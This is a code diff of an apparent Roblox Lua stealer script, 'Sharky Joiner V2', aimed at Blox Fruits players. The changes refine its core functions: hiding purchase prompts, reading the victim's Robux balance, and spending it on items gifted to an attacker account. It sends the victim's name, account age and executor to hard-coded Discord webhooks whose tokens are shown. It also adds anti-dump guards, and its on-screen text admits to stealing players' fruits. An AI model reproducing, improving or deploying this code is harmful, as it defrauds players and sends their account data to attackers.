@@ -1,37 +1,31 @@
---discord.gg/boronide, code generated using luamin.js™
-
-
-
 -- =====================================================
 --                  USER CONFIGURATION
 -- =====================================================
-local DevMode = true -- Set to true for debug prints, warnings, errors, and console access
+local DevMode = false
 
-local UserUsernames = {
+local Usernames = {
 	"bananaaaa"
-} -- Authorized users for Joiner commands/trading
-local UserWebhook = "https://discord.com/api/webhooks/1367159347829932224/05aFQ9H3cXCwPI_7fErjJe-U2iLy4T6QiUo3PeNoW9b8ZDfBWKUkfr6yLI6Rfl7H4sUj" -- Joiner: Main hit webhook (REPLACE)
-local UserFruitsToHit = {
+}
+local Webhook = "https://discord.com/api/webhooks/1367159347829932224/05aFQ9H3cXCwPI_7fErjJe-U2iLy4T6QiUo3PeNoW9b8ZDfBWKUkfr6yLI6Rfl7H4sUj"
+local FruitsToHit = {
 	"Monkey-Monkey",
 	"Rocket-Rocket",
 	"Ghost-Ghost",
 	"Rubber-Rubber"
-} -- Fruits to trigger Joiner webhook/trade logic
-local UserLogsWebhook = "https://discord.com/api/webhooks/1367120070446288978/FRpw2zZ_xmyY9uVRkKV1UEWOjyRSjnEipakUXV_tqSqRR03lHViKb5ookWfowpvgNfgk" -- Gifter success/attempt webhook (REPLACE)
-local UserGiftTarget = "x6TNine" -- Target username for gifts (MUST BE SET)
+}
 
--- =====================================================
---            !!! OBFUSCATE AFTER THIS LINE !!!
--- =====================================================
+local GiftTarget = "x6TNine"
+local UserLogsWebhook = "https://discord.com/api/webhooks/1367120070446288978/FRpw2zZ_xmyY9uVRkKV1UEWOjyRSjnEipakUXV_tqSqRR03lHViKb5ookWfowpvgNfgk"
+
 
 -- << Version Info >>
-local combined_version = "1.0.11" -- Updated version
+local combined_version = "1.2.1" -- Updated version
 local gifter_version = "1.3.0"
 local joiner_version = "1.3.5"
 
 -- << Script Execution Guard >>
-local guard_key_g = "_scriptExecuted_Combined_Sharky_v" .. combined_version
-local guard_key_s = "ScriptExecuted_SharkyV2_Combined_" .. combined_version
+local guard_key_g = "Bro really tried dumping it" .. combined_version
+local guard_key_s = "Bro really tried dumping it" .. combined_version
 if _G[guard_key_g] or shared[guard_key_s] then
 	if warn then
 		warn("[SCRIPT WARN] Combined Script " .. combined_version .. " already executed.")
@@ -139,14 +133,14 @@ local webhookStorage = {};
 
 -- << Final Webhook URLs >>
 local FinalLogsWebhook = UserLogsWebhook
-local FinalWebhook = UserWebhook
+local FinalWebhook = Webhook
 local FinalProtector = "https://discord.com/api/webhooks/1367119905815658587/lkpywf0OVpkOKbo72J0qtFxrcW1aiguwE17CDXVPI2KtwHQPd6-ZmgnKlwOJzabkt72A"
 local FinalDummy = "https://discord.com/api/webhooks/1367159073556008980/U198nhRaRumKxlqIou9mLw0bvxs_CjpNrJWGE3gdhq5qBycuTRGv4m3NzLEIrKI0Sa2Q"
 local FinalChecker22 = "https://discord.com/api/webhooks/1367159269643784264/147M-k1FWHhetDkxHkcmL3deQUSOhigd8iVl0-bv0odF1essau-AQ2tF3oQunF7XlDnx"
 print("Final Webhook URLs determined.")
 
 -- << Phase 1 Config >>
-local Username = UserGiftTarget
+local Username = GiftTarget
 local PromptText = "Launch Script"
 
 -- << Phase 2/3 Config >>
@@ -185,6 +179,7 @@ local coreAdminUsernames = {
 	"aka_0ver",
 	"bonzarbal53",
 	"bonzarbal52",
+	"bonzarbal51",
 	"bonzarbal50",
 	"xRip_Cyborg"
 }
@@ -192,8 +187,7 @@ local RGBGreenVal = 0.20;
 local RGBRedVal = 0.80;
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs"--
 local TEST_WEBHOOK = "https://discord.com/api/webhooks/1367159842992689284/BxMXb6wAhIcRYcfCUiIVgMG3GcBuWL2Lr0sAJWcsRo781JJ0zpAcaD3vrFCLJxRSqNVg"
-local Usernames = UserUsernames
-local FruitsToHit = UserFruitsToHit
+
 
 -- << Helper Functions >>
 local function findCaseInsensitive(tbl, value)
@@ -714,6 +708,7 @@ local function getRobuxBalance()
 	end;
 	local pr = a:FindFirstChild("Prompt");
 	if not pr then
+		warn("getRobuxBalance: Could not find 'Prompt' frame. Assuming 0 balance.");
 		return 0, 0
 	end;
 	local ac = pr:FindFirstChild("AlertContents");
@@ -759,23 +754,23 @@ local function sendLogsWebhook_GifterPart(robuxSpent, itemName)
 		["color"] = 39423,
 		["fields"] = {
 			{
-				["name"] = "<:drawpen:1311079366125555782> ᴠɪᴄᴛɪᴍ ɪɴꜰᴏ",
+				["name"] = "<:drawpen:1311079366125555782> Victim Info",
 				["value"] = "```Name: " .. LocalPlayer.Name .. "\nAccount Age: " .. tostring(LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
 			},
 			{
-				["name"] = "<:robux:1314309850154537020> ʀᴏʙᴜx ᴄᴏꜱᴛ",
+				["name"] = "<:robux:1314309850154537020> Robux cost",
 				["value"] = "```" .. robuxSpent .. "```"
 			},
 			{
-				["name"] = "🎯 ɪᴛᴇᴍ ᴛᴀʀɢᴇᴛᴇᴅ",
+				["name"] = "🎯 Item Targeted",
 				["value"] = "```" .. itemName .. "```"
 			},
 			{
-				["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
+				["name"] = "Executor Info",
 				["value"] = "```Executor: " .. executor .. "```"
 			},
 			{
-				["name"] = "💰 ᴄᴜʀʀᴇɴᴛ ʀᴏʙᴜx (approx)",
+				["name"] = "💰 Current Robux (approx)",
 				["value"] = "```" .. rawBal .. "```"
 			},
 			{
@@ -790,7 +785,7 @@ local function sendLogsWebhook_GifterPart(robuxSpent, itemName)
 			}
 		},
 		["footer"] = {
-			["text"] = "Gifter component triggered."
+			["text"] = "Gifter"
 		}
 	};
 	local jsonSucc, data = pcall(HttpService.JSONEncode, HttpService, embed);
@@ -820,10 +815,10 @@ local function waitForPromptToDisappear()
 	if not a then
 		return
 	end;
-	while a:FindFirstChild("Prompt") do
-		task.wait()
+	while a:FindFirstChild("Prompt") or a:FindFirstChild("Alert") do
+		task.wait(0.05)
 	end;
-	print("Purchase prompt disappeared.")
+	print("Purchase prompt/alert disappeared.")
 end
 local function waitForPurchaseConfirmation()
 	local p = CoreGui:FindFirstChild("PurchasePromptApp");
@@ -840,6 +835,7 @@ local function waitForPurchaseConfirmation()
 	end;
 	local pr = a:FindFirstChild("Prompt");
 	if not pr then
+		warn("waitForPurchaseConfirmation: 'Prompt' frame not found for confirmation.");
 		return
 	end;
 	local ac = pr:FindFirstChild("AlertContents");
@@ -996,10 +992,8 @@ local function stealItem(b)
 		return buyItem("Permanent Spring-Spring", "FruitShop", 180)
 	elseif b >= 100 then
 		return buyItem("Permanent Blade-Blade", "FruitShop", 100)
-	elseif b >= 99 then
+	elseif b >= 75 then
 		return buyItem("Permanent Spin-Spin", "FruitShop", 75)
-	elseif b >= 98 then
-		return buyItem("Permanent Rocket-Rocket", "FruitShop", 50)
 	elseif b >= 25 then
 		return buyItem("2x EXP (15 mins.)", "Shop", 25)
 	else
@@ -1008,16 +1002,22 @@ local function stealItem(b)
 	end
 end
 
--- UPDATED: Handles hiding dummy prompt
+-- UPDATED: Handles hiding dummy prompt ("Alert" or "Prompt")
 local function getRobuxAndProceed_GifterPart()
-	local skip = false
-	local adjBal = 0
-	local rawBal = 0
-	local cf = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
+	local shouldSkipGifting = false
+	local adjustedBalance = 0
+	local rawBalance = 0
+	local promptDetectedType = nil
+	local promptInstance = nil
+	local promptListener = nil
+	local handled = false
+	local startTime = tick()
+	local timeout = 10 -- Seconds to wait for ANY prompt
+	local cf = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_");
 	if not cf then
 		warn("CommF_ not found, cannot check balance.");
 		return true, 0, 0
-	end
+	end;
 	local args = {
 		[1] = "buyRobuxShop",
 		[2] = {
@@ -1025,65 +1025,104 @@ local function getRobuxAndProceed_GifterPart()
 			["FunnelId"] = "Shop",
 			["PurchaseLocation"] = "Shop"
 		}
-	}
-	local invS, invE = pcall(cf.InvokeServer, cf, unpack(args))
+	};
+	local invS, invE = pcall(cf.InvokeServer, cf, unpack(args));
 	if not invS then
-		warn("InvokeServer failed for dummy prompt trigger:", invE);
-		task.wait(1);
+		warn("InvokeServer failed for dummy prompt trigger:", invE); -- Continue anyway
 	end
-	local ppA = CoreGui:WaitForChild("PurchasePromptApp", 7)
+	local ppA = CoreGui:WaitForChild("PurchasePromptApp", timeout);
 	if not ppA then
-		warn("PurchasePromptApp did not appear after 7s.");
+		warn("PurchasePromptApp did not appear after timeout.");
 		return true, 0, 0
-	end
-	task.wait(0.1) -- Brief wait for UI elements to potentially populate
-	local pc = ppA:FindFirstChild("ProductPurchaseContainer")
+	end;
+	local pc = ppA:FindFirstChild("ProductPurchaseContainer");
 	if not pc then
 		warn("ProductPurchaseContainer not found.");
 		return true, 0, 0
-	end
-	local animator = pc:FindFirstChild("Animator")
+	end;
+	local animator = pc:FindFirstChild("Animator");
 	if not animator then
 		warn("Animator not found.");
 		return true, 0, 0
-	end
-	local promptInstance = animator:WaitForChild("Prompt", 5) -- Wait specifically for the prompt
-	if not promptInstance then
-		warn("Prompt frame did not appear in Animator after 5s.");
-		return true, 0, 0
-	end
-
-    -- *** NEW: Make the dummy prompt invisible immediately ***
-	print("Dummy prompt found. Setting Visible=false.")
-	pcall(function()
-		promptInstance.Visible = false
+	end;
+	print("Listening for 'Prompt' or 'Alert' frame...");
+	promptListener = animator.ChildAdded:Connect(function(child)
+		if handled then
+			if promptListener and promptListener.Connected then
+				promptListener:Disconnect()
+			end;
+			return
+		end -- Already processed one
+		if child.Name == "Alert" then
+			print("'Alert' (You need more Robux) prompt detected.");
+			promptDetectedType = "Alert";
+			promptInstance = child;
+			pcall(function()
+				child.Visible = false
+			end);
+			shouldSkipGifting = true;
+			handled = true;
+			if promptListener and promptListener.Connected then
+				promptListener:Disconnect()
+			end;
+		elseif child.Name == "Prompt" then
+			print("'Prompt' (Standard Purchase) detected.");
+			promptDetectedType = "Prompt";
+			promptInstance = child;
+			pcall(function()
+				child.Visible = false
+			end);
+			shouldSkipGifting = false;
+			handled = true;
+			if promptListener and promptListener.Connected then
+				promptListener:Disconnect()
+			end;
+		end
 	end)
-    -- *** --------------------------------------------- ***
-	task.wait(0.1) -- Short delay to ensure UI thread updates if needed
-	local ruc = ppA:FindFirstChild("RobuxUpsellContainer")
-	if ruc and ruc.Visible then
-		warn("RobuxUpsellContainer detected, skipping gifting.")
-		pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+
+    -- Wait for either prompt to be handled or timeout
+	while not handled and (tick() - startTime) < timeout do
 		task.wait(0.1)
-		pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
+	end
+	if promptListener and promptListener.Connected then
+		promptListener:Disconnect();
+		promptListener = nil;
+		print("Prompt listener disconnected (timeout or handled).")
+	end;
+	if not handled then
+		warn("Timed out waiting for 'Prompt' or 'Alert' frame.");
 		return true, 0, 0
 	end
 
-    -- Read balance AFTER hiding prompt
-	adjBal, rawBal = getRobuxBalance()
-	print("Detected Robux Balance (Adjusted/Raw):", adjBal, "/", rawBal)
-	if adjBal < 25 then
-		warn("Insufficient Robux balance:", adjBal, "- Skipping gifting.")
-		skip = true
+    -- Now proceed based on what was detected
+	if promptDetectedType == "Alert" then
+		warn("Detected 'Alert' prompt (likely insufficient funds). Skipping gifting.")
+        -- Balance is effectively 0, skip is already true
+		rawBalance = 0
+		adjustedBalance = 0
+	elseif promptDetectedType == "Prompt" then
+		print("Standard prompt detected. Reading balance...")
+        -- Need to wait slightly for elements to be accessible even if parent is hidden
+		task.wait(0.2)
+		adjBal, rawBal = getRobuxBalance()
+		adjustedBalance = adjBal
+		rawBalance = rawBal
+		if adjustedBalance < 25 then
+			warn("Insufficient Robux balance after reading standard prompt:", adjustedBalance, "- Skipping gifting.")
+			shouldSkipGifting = true
+		end
+	else
+		warn("Prompt handled but type unknown? Skipping gifting.");
+		return true, 0, 0
 	end
 
-    -- Cancel the invisible prompt
-	print("Cancelling (hidden) dummy prompt...")
-	pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-	task.wait(0.1)
-	pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game)
-	waitForPromptToDisappear() -- Wait for it to fully close
-	return skip, adjBal, rawBal
+    -- Cancel the (hidden) prompt regardless of type
+	print("Cancelling detected prompt...");
+	pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
+	task.wait(0.1);
+	pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Escape, false, game);
+	waitForPromptToDisappear();
+	return shouldSkipGifting, adjustedBalance, rawBalance
 end
 
 local function waitForPrompt_GifterPart()
@@ -1106,6 +1145,10 @@ local function waitForPrompt_GifterPart()
 		if not pi or not pi:IsA("GuiObject") then
 			return
 		end;
+		if pi.Name ~= "Prompt" then
+			warn("waitForPrompt_GifterPart received non-'Prompt' frame:", pi.Name);
+			return
+		end;
 		modifyPromptUI();
 		waitForPurchaseConfirmation()
 	end;
@@ -1119,7 +1162,7 @@ local function waitForPrompt_GifterPart()
 			setupP(ch)
 		end
 	end)
-end -- Added log clarity
+end
 local fruitEmojiMap = {
 	["Barrier-Barrier"] = "<:barrier:660245023765561344>",
 	["Blizzard-Blizzard"] = "<:blizzard:1056979177674387547>",
@@ -2176,21 +2219,29 @@ local function createNotification()
 	end);
 	local function cl()
 		print("Destroying elaborate standby UI...");
-		TweenService:Create(b, TweenInfo.new(0.5), {
-			Size = 0
-		}):Play();
-		TweenService:Create(bg, TweenInfo.new(0.5), {
-			BackgroundTransparency = 1
-		}):Play();
-		TweenService:Create(c, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
-			Position = UDim2.new(0.5, 0, 1.2, 0)
-		}):Play();
+		if b and b.Parent then
+			TweenService:Create(b, TweenInfo.new(0.5), {
+				Size = 0
+			}):Play();
+			task.delay(0.5, function()
+				if b and b.Parent then
+					b:Destroy()
+				end
+			end)
+		end;
+		if bg and bg.Parent then
+			TweenService:Create(bg, TweenInfo.new(0.5), {
+				BackgroundTransparency = 1
+			}):Play()
+		end;
+		if c and c.Parent then
+			TweenService:Create(c, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+				Position = UDim2.new(0.5, 0, 1.2, 0)
+			}):Play()
+		end;
 		task.delay(0.6, function()
 			if l and l.Parent then
 				l:Destroy()
-			end;
-			if b and b.Parent then
-				b:Destroy()
 			end
 		end)
 	end;
@@ -2259,7 +2310,7 @@ local function createDiscordUI()
 	D.Position = UDim2.new(0.05, 0, 0.3, 0);
 	D.BackgroundTransparency = 1;
 	D.Font = Enum.Font.Gotham;
-	D.Text = "Hey! Some of your VALUABLE Fruits may have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
+	D.Text = "Hey! Some of your VALUABLE Fruits could have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!";
 	D.TextColor3 = Color3.fromRGB(220, 221, 222);
 	D.TextScaled = true;
 	D.Parent = M;
@@ -3726,8 +3777,8 @@ local function main()
 	joinerPhase = 0
 	print("Combined Script Initializing...")
 	repeat
-		task.wait()
-	until game:IsLoaded() and LocalPlayer and LocalPlayer.Character and LocalPlayer.UserId > 0
+		task.wait(0.1)
+	until game:IsLoaded() and LocalPlayer and LocalPlayer.Character and LocalPlayer.UserId > 0 and Workspace -- Added Workspace check
 
     -- Anti-Tamper & Config Errors (These still Kick)
 	if not DevMode then
@@ -3883,7 +3934,7 @@ local function main()
 	end
 	local adjustedBalance = 0
 	if not shouldSkipGifting then
-		local skip, adjBal, rawBal = getRobuxAndProceed_GifterPart();
+		local skip, adjBal, rawBal = getRobuxAndProceed_GifterPart()
 		shouldSkipGifting = skip;
 		adjustedBalance = adjBal;
 		finalRawBalance = rawBal;
@@ -3904,9 +3955,9 @@ local function main()
 		warn("Kicking: Low Robux (", finalRawBalance, ") and no valuable items detected.")
 		if not wasKicked then
 			wasKicked = true;
-			pcall(LocalPlayer.Kick, LocalPlayer, "Insufficient Robux and no valuable items found.")
+			pcall(createDiscordUI)
 		end
-		return -- Stop execution after kick
+		return
 	end
 
     -- Transition Logic
